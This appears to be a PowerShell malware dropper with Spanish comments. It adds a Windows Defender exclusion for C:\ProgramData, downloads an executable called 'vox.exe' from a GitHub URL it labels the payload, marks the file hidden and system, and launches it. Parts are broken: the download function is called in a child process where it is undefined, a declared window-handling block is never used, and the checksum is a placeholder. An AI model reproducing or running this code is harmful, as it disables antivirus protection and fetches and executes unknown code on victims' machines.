# Agregar exclusiones a Windows Defender
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /f /reg:64
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\ProgramData" /d 0 /f /reg:64

# Definir la ruta del archivo, el hash esperado y la URL del payload
$filePath = "C:\ProgramData\vox.exe"
$expectedHash = "1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef"  # Hash SHA256 aleatorio
$url = "https://github.com/scripthelpercode/00scripthelpx/raw/main/vox.exe"

# Función para descargar y verificar el payload
function Download-Payload {
    param (
        [string]$filePath,
        [string]$expectedHash,
        [string]$url
    )

    if (!(Test-Path $filePath) -or ((Get-FileHash $filePath -Algorithm SHA256).Hash -ne $expectedHash)) {
        Remove-Item -Path $filePath -Force
        Invoke-WebRequest -Uri $url -OutFile $filePath
        (Get-Item $filePath).Attributes = 'ReadOnly, Hidden, System'
    }
}

# Ejecutar la función al inicio de la sesión
Add-Type @"
using System.Runtime.InteropServices;
public class Startup {
    [DllImport("user32.dll")]
    public static extern bool SetForegroundWindow(IntPtr hWnd);
    [DllImport("user32.dll")]
    public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
    [DllImport("user32.dll")]
    public static extern bool IsIconic(IntPtr hWnd);
    [DllImport("user32.dll")]
    public static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);
    [StructLayout(LayoutKind.Sequential)]
    public struct RECT {
        public int Left;
        public int Top;
        public int Right;
        public int Bottom;
    }
}
"@

$proc = Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"& { Download-Payload -filePath '$filePath' -expectedHash '$expectedHash' -url '$url' }`"" -PassThru
$proc.WaitForExit()

# Ejecutar el payload
Start-Process $filePath